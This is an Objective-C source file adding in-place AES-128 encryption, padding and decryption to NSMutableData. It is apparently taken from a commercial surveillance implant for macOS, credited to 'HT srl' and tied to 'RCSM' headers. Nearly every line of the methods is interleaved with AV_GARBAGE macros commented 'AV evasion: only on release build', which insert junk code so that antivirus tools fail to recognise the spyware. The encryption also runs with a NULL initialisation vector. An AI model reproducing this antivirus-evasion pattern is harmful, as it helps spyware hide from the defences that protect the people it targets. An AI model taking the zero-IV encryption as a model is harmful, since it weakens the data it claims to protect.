/*
 * NSMutableData AES128 Category
 *  This is a category for NSMutableData in order to provide in-place encryption
 *  capabilities
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 08/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "NSMutableData+AES128.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSMutableData (AES128)

- (void)removePadding
{
  // remove padding
  char bytesOfPadding;
  @try
  {
    [self getBytes: &bytesOfPadding
             range: NSMakeRange([self length] - 1, sizeof(char))];
  }
  @catch (NSException *e)
  {
#ifdef DEBUG_MUTABLE_AES
    errorLog(@"Exception on getbytes (%@)", [e reason]);
#endif
    return;
  }
  
  
#ifdef DEBUG_MUTABLE_AES
  infoLog(@"byte: %d", bytesOfPadding);
#endif
  
  [self setLength: [self length] - bytesOfPadding];
}

-(void)doPKCS7Padding:(uint)pad
{   
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (pad > 0)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    [self increaseLengthBy: pad];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    char *buff  = (char*)[self bytes];   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    char *ptr   = buff + [self length] - pad;
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    // do ourself pkcs5/7 padding
    for (int i=0; i < pad; i++) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      *ptr = pad;   
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      ptr++;   
      // AV evasion: only on release build
      AV_GARBAGE_000
      
    }
  }
}

- (CCCryptorStatus)__encryptWithKey: (NSData *)aKey
{
  //no padding on aligned block: only for logs
  int pad = [self length];
  int outLen = 0;
  BOOL needsPadding = YES;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([self length] % kCCBlockSizeAES128)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      pad = ([self length] + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - [self length];
    
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [self increaseLengthBy: pad];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      outLen        = [self length];   
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      needsPadding  = YES;
    }
  else
    {
      pad           = 0;   
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      outLen        = [self length];   
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      needsPadding  = NO;
    }
  
#ifdef DEBUG_MUTABLE_AES
  infoLog(@"outLen: %d", outLen);
  infoLog(@"pad: %d", pad);
#endif
  
  //
  // encrypts in-place since this is a mutable data object
  //
  size_t numBytesEncrypted = 0;
  CCCryptorStatus result;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (needsPadding == YES)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      result = CCCrypt(kCCEncrypt, 
                       kCCAlgorithmAES128, 
                       kCCOptionPKCS7Padding,
                       [aKey bytes], 
                       kCCKeySizeAES128,
                       NULL,                                      // initialization vector (optional)
                       [self mutableBytes], [self length] - pad,  // input
                       [self mutableBytes], outLen,               // output
                       &numBytesEncrypted);
    }
  else
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      result = CCCrypt(kCCEncrypt, 
                       kCCAlgorithmAES128, 
                       0,
                       [aKey bytes], 
                       kCCKeySizeAES128,
                       NULL,                                      // initialization vector (optional)
                       [self mutableBytes], [self length] - pad,  // input
                       [self mutableBytes], outLen,               // output
                       &numBytesEncrypted);
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return result;
}

- (CCCryptorStatus)encryptWithKey: (NSData *)aKey
{
  int pad = kCCBlockSizeAES128;
  size_t numBytesEncrypted = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([self length] % kCCBlockSizeAES128)
    pad = kCCBlockSizeAES128 - [self length] & (kCCBlockSizeAES128 - 1);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [self doPKCS7Padding: pad];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // padding ourself
  CCCryptorStatus result = 
                  CCCrypt(kCCEncrypt, 
                          kCCAlgorithmAES128, 
                          0,
                          [aKey bytes], 
                          kCCKeySizeAES128,
                          NULL,                                  // initialization vector (optional)
                          [self mutableBytes], [self length],    // input
                          [self mutableBytes], [self length],    // output
                          &numBytesEncrypted);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return result;
}


- (CCCryptorStatus)decryptWithKey: (NSData *)aKey
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // decrypts in-place since this is a mutable data object
  //
  size_t numBytesDecrypted = 0;
  CCCryptorStatus result = CCCrypt(kCCDecrypt, 
                                   kCCAlgorithmAES128, 
                                   0,
                                   [aKey bytes], 
                                   kCCKeySizeAES128,
                                   NULL,                                // initialization vector (optional)
                                   [self mutableBytes], [self length],  // input
                                   [self mutableBytes], [self length],  // output
                                   &numBytesDecrypted);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return result;
}

@end
